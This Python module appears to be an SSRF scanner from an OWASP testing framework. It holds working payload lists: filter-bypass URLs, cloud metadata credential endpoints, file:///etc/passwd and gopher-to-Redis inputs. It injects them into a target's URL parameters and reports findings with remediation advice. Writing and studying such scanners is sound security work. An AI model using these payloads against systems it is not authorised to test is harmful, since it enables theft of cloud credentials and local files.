"""
A10:2021 - Server-Side Request Forgery (SSRF) Attack Module.

This module implements detection of SSRF vulnerabilities including:
- Basic SSRF to internal services
- Cloud metadata endpoint access
- Protocol smuggling
- URL bypass techniques
- Blind SSRF detection patterns
"""

import re
import time
from typing import Any, Dict, Generator, List
from urllib.parse import quote

from attacks.base import Finding, Severity
from attacks.owasp import OWASPRegistry
from attacks.owasp.base_owasp import BaseOWASPAttack, OWASPCategory, OWASPTestCase


@OWASPRegistry.register("a10")
class SSRFAttack(BaseOWASPAttack):
    """
    Server-Side Request Forgery (SSRF) scanner.

    Tests for SSRF vulnerabilities that allow access to internal resources.
    """

    name = "SSRF Scanner"
    description = "Detects Server-Side Request Forgery vulnerabilities"
    category = OWASPCategory.A10_SSRF

    # Internal/localhost variations
    LOCALHOST_PAYLOADS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:8080/",
        "http://0.0.0.0/",
        "http://0/",
        "http://[::1]/",
        "http://127.1/",
        "http://127.0.1/",
    ]

    # Bypass techniques for SSRF filters
    BYPASS_PAYLOADS = [
        # Decimal IP encoding
        "http://2130706433/",  # 127.0.0.1
        "http://017700000001/",  # Octal
        "http://0x7f000001/",  # Hex
        # URL encoding
        "http://127.0.0.1%00@evil.com/",
        "http://evil.com@127.0.0.1/",
        "http://127.0.0.1#@evil.com/",
        # DNS rebinding style
        "http://localtest.me/",  # Resolves to 127.0.0.1
        "http://127.0.0.1.nip.io/",
        # Protocol variations
        "http://localhost:22/",  # SSH
        "http://localhost:3306/",  # MySQL
        "http://localhost:5432/",  # PostgreSQL
        "http://localhost:6379/",  # Redis
        "http://localhost:27017/",  # MongoDB
        "http://localhost:11211/",  # Memcached
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA_PAYLOADS = [
        # AWS IMDSv1
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # AWS IMDSv2 token endpoint
        "http://169.254.169.254/latest/api/token",
        # GCP
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/",
        # Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/",
    ]

    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "file:///etc/hosts",
        "dict://localhost:11211/stats",
        "gopher://localhost:6379/_INFO",
        "ftp://localhost/",
    ]

    # Common URL parameters to test
    URL_PARAMETERS = [
        "url",
        "uri",
        "path",
        "link",
        "src",
        "source",
        "dest",
        "destination",
        "target",
        "page",
        "feed",
        "redirect",
        "return",
        "next",
        "site",
        "host",
        "fetch",
        "download",
        "load",
        "proxy",
        "image",
        "img",
        "file",
        "document",
        "pdf",
        "callback",
        "continue",
        "go",
        "goto",
        "view",
        "open",
    ]

    # Patterns indicating SSRF success
    SSRF_SUCCESS_PATTERNS = {
        "internal_html": [
            r"<title>.*Index of.*</title>",
            r"Apache.*Server at",
            r"nginx",
            r"Welcome to nginx",
        ],
        "cloud_metadata": [
            r"ami-[a-f0-9]+",
            r"instance-id",
            r"placement/availability-zone",
            r"iam/security-credentials",
            r"AccessKeyId",
            r"SecretAccessKey",
            r"computeMetadata",
        ],
        "internal_services": [
            r"redis_version",
            r"MySQL",
            r"PostgreSQL",
            r"MongoDB",
            r"MEMCACHED",
        ],
        "file_access": [
            r"root:.*:0:0:",  # /etc/passwd
            r"\[extensions\]",  # win.ini
            r"127\.0\.0\.1\s+localhost",  # /etc/hosts
        ],
    }

    def __init__(self):
        super().__init__()

    def configure(self, **kwargs) -> None:
        """
        Configure SSRF attack parameters.

        Args:
            test_localhost: Test localhost/internal IPs (default: True)
            test_cloud: Test cloud metadata endpoints (default: True)
            test_protocols: Test protocol smuggling (default: True)
            test_bypass: Test filter bypass techniques (default: True)
            custom_params: Additional URL parameters to test (default: [])
        """
        super().configure(**kwargs)
        self._config["test_localhost"] = kwargs.get("test_localhost", True)
        self._config["test_cloud"] = kwargs.get("test_cloud", True)
        self._config["test_protocols"] = kwargs.get("test_protocols", True)
        self._config["test_bypass"] = kwargs.get("test_bypass", True)
        self._config["custom_params"] = kwargs.get("custom_params", [])

    def get_config_options(self) -> Dict[str, Any]:
        """Get configuration options."""
        options = super().get_config_options()
        options.update(
            {
                "test_localhost": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test localhost and internal IP access",
                },
                "test_cloud": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test cloud metadata endpoint access",
                },
                "test_protocols": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test alternative protocol access (file://, gopher://)",
                },
                "test_bypass": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test SSRF filter bypass techniques",
                },
                "custom_params": {
                    "type": "array",
                    "default": [],
                    "description": "Additional URL parameters to test",
                },
            }
        )
        return options

    def get_test_cases(self) -> List[OWASPTestCase]:
        """Get test cases for SSRF."""
        return [
            OWASPTestCase(
                name="Localhost SSRF",
                description="Test for internal resource access",
                category=OWASPCategory.A10_SSRF,
                payloads=self.LOCALHOST_PAYLOADS,
                detection_patterns=self.SSRF_SUCCESS_PATTERNS["internal_html"],
            ),
            OWASPTestCase(
                name="Cloud Metadata SSRF",
                description="Test for cloud metadata endpoint access",
                category=OWASPCategory.A10_SSRF,
                payloads=self.CLOUD_METADATA_PAYLOADS,
                detection_patterns=self.SSRF_SUCCESS_PATTERNS["cloud_metadata"],
            ),
            OWASPTestCase(
                name="Protocol Smuggling",
                description="Test for alternative protocol access",
                category=OWASPCategory.A10_SSRF,
                payloads=self.PROTOCOL_PAYLOADS,
                detection_patterns=self.SSRF_SUCCESS_PATTERNS["file_access"],
            ),
        ]

    def _find_url_parameters(self, target: str) -> List[str]:
        """Find URL parameters that might be vulnerable to SSRF."""
        params_found = []
        base_url = self._normalize_url(target)

        # Get the page and find forms/parameters
        response = self._make_request(base_url)

        if response:
            content = response.text

            # Find URL parameters in the page
            param_patterns = [
                r'name=["\'](' + "|".join(self.URL_PARAMETERS) + r')["\']',
                r'id=["\'](' + "|".join(self.URL_PARAMETERS) + r')["\']',
                r"\?(" + "|".join(self.URL_PARAMETERS) + r")=",
            ]

            for pattern in param_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                params_found.extend(matches)

        # Add common parameters regardless
        params_found.extend(self.URL_PARAMETERS)

        # Add custom parameters from config
        params_found.extend(self._config.get("custom_params", []))

        return list(set(params_found))

    def _check_ssrf_response(self, response, payload: str) -> Dict[str, Any]:
        """Check if response indicates successful SSRF."""
        if not response:
            return {"vulnerable": False}

        content = response.text
        findings: Dict[str, Any] = {"vulnerable": False, "type": None, "evidence": []}

        # Check each category of patterns
        for category, patterns in self.SSRF_SUCCESS_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    findings["vulnerable"] = True
                    findings["type"] = category
                    findings["evidence"].append(pattern)

        # Check for specific responses that indicate SSRF
        if "169.254.169.254" in payload:
            # Cloud metadata indicators
            if "ami-" in content or "instance-id" in content:
                findings["vulnerable"] = True
                findings["type"] = "cloud_metadata"
                findings["evidence"].append("AWS metadata response detected")

            if "computeMetadata" in content or "google" in content.lower():
                findings["vulnerable"] = True
                findings["type"] = "cloud_metadata"
                findings["evidence"].append("GCP metadata response detected")

        if "127.0.0.1" in payload or "localhost" in payload:
            # Check for internal service responses
            if response.status_code == 200 and len(content) > 0:
                # Check if content differs from normal error pages
                if not any(
                    x in content.lower() for x in ["not found", "error", "forbidden"]
                ):
                    findings["vulnerable"] = True
                    findings["type"] = "internal_access"
                    findings["evidence"].append("Internal resource accessible")

        return findings

    def _test_localhost_ssrf(
        self, target: str, params: List[str]
    ) -> Generator[Finding, None, None]:
        """Test for localhost/internal IP SSRF."""
        if not self._config.get("test_localhost", True):
            return

        base_url = self._normalize_url(target)
        payloads = self.LOCALHOST_PAYLOADS.copy()

        if self._config.get("test_bypass", True):
            payloads.extend(self.BYPASS_PAYLOADS)

        total = len(params) * len(payloads)
        current = 0

        for param in params[:5]:  # Limit parameters tested
            for payload in payloads:
                if self.is_cancelled():
                    return

                # Test GET parameter
                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._make_request(test_url)

                result = self._check_ssrf_response(response, payload)

                if result["vulnerable"]:
                    yield Finding(
                        title="SSRF Vulnerability: Internal Resource Access",
                        severity=Severity.HIGH,
                        description=f"Server-Side Request Forgery detected. "
                        f"Parameter '{param}' allows access to internal resources.",
                        evidence=f"URL: {test_url}, Type: {result['type']}, "
                        f"Evidence: {result['evidence']}",
                        remediation="Validate and sanitize URL inputs. Use allowlists for "
                        "permitted domains. Block requests to internal IPs and localhost.",
                        metadata={
                            "parameter": param,
                            "payload": payload,
                            "type": result["type"],
                            "evidence": result["evidence"],
                        },
                    )

                current += 1
                self.set_progress(current / total * 25)
                time.sleep(self._delay_between_requests)

    def _test_cloud_metadata(
        self, target: str, params: List[str]
    ) -> Generator[Finding, None, None]:
        """Test for cloud metadata endpoint access."""
        if not self._config.get("test_cloud", True):
            return

        base_url = self._normalize_url(target)
        total = len(params) * len(self.CLOUD_METADATA_PAYLOADS)
        current = 0

        for param in params[:5]:
            for payload in self.CLOUD_METADATA_PAYLOADS:
                if self.is_cancelled():
                    return

                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._make_request(test_url)

                result = self._check_ssrf_response(response, payload)

                if result["vulnerable"]:
                    # Cloud metadata SSRF is critical
                    yield Finding(
                        title="SSRF: Cloud Metadata Access",
                        severity=Severity.CRITICAL,
                        description=(
                            "Critical SSRF vulnerability allows access to cloud "
                            "metadata endpoint. This can expose credentials and "
                            "sensitive instance information."
                        ),
                        evidence=f"URL: {test_url}, Payload: {payload}",
                        remediation=(
                            "Block access to 169.254.169.254 and other metadata IPs. "
                            "Use IMDSv2 (token-based) on AWS. Implement strict URL validation."
                        ),
                        metadata={
                            "parameter": param,
                            "payload": payload,
                            "cloud_provider": self._detect_cloud_provider(payload),
                            "evidence": result["evidence"],
                        },
                    )

                current += 1
                self.set_progress(25 + current / total * 25)
                time.sleep(self._delay_between_requests)

    def _detect_cloud_provider(self, payload: str) -> str:
        """Detect cloud provider from metadata URL."""
        if "169.254.169.254" in payload:
            if "computeMetadata" in payload:
                return "GCP"
            elif "metadata/instance" in payload or "metadata/identity" in payload:
                return "Azure"
            elif "opc/v1" in payload:
                return "Oracle Cloud"
            else:
                return "AWS"
        elif "metadata.google.internal" in payload:
            return "GCP"
        elif "100.100.100.200" in payload:
            return "Alibaba Cloud"
        return "Unknown"

    def _test_protocol_smuggling(
        self, target: str, params: List[str]
    ) -> Generator[Finding, None, None]:
        """Test for protocol smuggling attacks."""
        if not self._config.get("test_protocols", True):
            return

        base_url = self._normalize_url(target)
        total = len(params) * len(self.PROTOCOL_PAYLOADS)
        current = 0

        for param in params[:5]:
            for payload in self.PROTOCOL_PAYLOADS:
                if self.is_cancelled():
                    return

                test_url = f"{base_url}?{param}={quote(payload)}"
                response = self._make_request(test_url)

                result = self._check_ssrf_response(response, payload)

                if result["vulnerable"]:
                    # Determine severity based on protocol
                    severity = Severity.HIGH
                    if payload.startswith("file://"):
                        severity = Severity.CRITICAL

                    protocol = (
                        payload.split("://")[0] if "://" in payload else "unknown"
                    )

                    yield Finding(
                        title=f"SSRF: Protocol Smuggling ({protocol}://)",
                        severity=severity,
                        description=f"SSRF vulnerability allows {protocol}:// protocol access. "
                        "This can be used to read local files or access internal services.",
                        evidence=f"URL: {test_url}, Payload: {payload}",
                        remediation="Restrict allowed protocols to http/https only. "
                        "Validate and sanitize all URL inputs.",
                        metadata={
                            "parameter": param,
                            "payload": payload,
                            "protocol": protocol,
                            "evidence": result["evidence"],
                        },
                    )

                current += 1
                self.set_progress(50 + current / total * 25)
                time.sleep(self._delay_between_requests)

    def _test_blind_ssrf_indicators(
        self, target: str
    ) -> Generator[Finding, None, None]:
        """Check for blind SSRF indicators and potential attack surfaces."""
        base_url = self._normalize_url(target)

        # Check for common SSRF-prone functionality
        ssrf_prone_endpoints = [
            "/proxy",
            "/fetch",
            "/download",
            "/image",
            "/avatar",
            "/webhook",
            "/callback",
            "/api/proxy",
            "/api/fetch",
            "/api/url",
            "/pdf",
            "/export",
            "/import",
            "/load",
        ]

        total = len(ssrf_prone_endpoints)

        for idx, endpoint in enumerate(ssrf_prone_endpoints):
            if self.is_cancelled():
                return

            test_url = f"{base_url}{endpoint}"
            response = self._make_request(test_url)

            if response and response.status_code in [200, 400, 405]:
                # Endpoint exists, check for URL parameters
                content = response.text.lower()

                url_indicators = ["url", "uri", "link", "fetch", "load"]
                found_indicators = [i for i in url_indicators if i in content]

                if found_indicators or response.status_code == 200:
                    yield Finding(
                        title=f"Potential SSRF Surface: {endpoint}",
                        severity=Severity.LOW,
                        description=f"Endpoint may be vulnerable to SSRF. "
                        f"URL-related indicators found: {found_indicators}",
                        evidence=f"URL: {test_url}, Status: {response.status_code}",
                        remediation="Review this endpoint for SSRF vulnerabilities. "
                        "Implement strict URL validation if it accepts URL parameters.",
                        metadata={
                            "endpoint": endpoint,
                            "indicators": found_indicators,
                            "status_code": response.status_code,
                        },
                    )

            self.set_progress(75 + (idx + 1) / total * 25)
            time.sleep(self._delay_between_requests)

    def run(self, target: str) -> Generator[Finding, None, None]:
        """
        Execute SSRF attack against the target.

        Args:
            target: Target URL

        Yields:
            Finding objects for each vulnerability discovered
        """
        self.reset()
        self._is_running = True

        yield Finding(
            title="SSRF Scan Started",
            severity=Severity.INFO,
            description="Starting Server-Side Request Forgery scan",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )

        try:
            # Find potential URL parameters
            params = self._find_url_parameters(target)

            # Test 1: Localhost SSRF (0-25%)
            yield from self._test_localhost_ssrf(target, params)

            # Test 2: Cloud Metadata (25-50%)
            yield from self._test_cloud_metadata(target, params)

            # Test 3: Protocol Smuggling (50-75%)
            yield from self._test_protocol_smuggling(target, params)

            # Test 4: Blind SSRF Indicators (75-100%)
            yield from self._test_blind_ssrf_indicators(target)

        finally:
            self._is_running = False
            self.set_progress(100.0)
            self.cleanup()

        yield Finding(
            title="SSRF Scan Completed",
            severity=Severity.INFO,
            description="Completed Server-Side Request Forgery scan",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )
